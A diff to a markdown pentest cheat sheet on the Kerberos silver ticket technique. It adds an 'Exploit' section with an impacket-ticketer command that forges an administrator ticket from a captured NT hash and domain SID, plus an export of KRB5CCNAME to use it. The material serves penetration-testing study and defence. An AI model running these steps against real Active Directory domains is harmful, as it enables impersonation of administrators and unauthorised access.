@@ -1,5 +1,4 @@
-
-# Silver Ticket Attack
+# Gather Info
 
 ## Get SPN and Dump Hash
 
@@ -51,4 +50,19 @@ print(f"S-{a}-{bbbbbb}-{cccc}-{dddd}-{eeee}-{ffff}-{gggg}")
 
 ./sid.py administratorbase64sid
 ```
+
+# Exploit
+
+## Request Silver Ticket
+
+Impacket Ticketer
+Be sure to omit the -500 on the end of the SID.
+`impacket-ticketer -nthash otheruserntlmhash -domain-sid administratorsid -domain domain -dc-ip dcfqdn -spn otheruserspnincludingport administrator`
+
+## Set Env Var
+
+ccache file
+`export KRB5CCNAME=administrator.ccache`
+
+## Connect to Desired Services
 
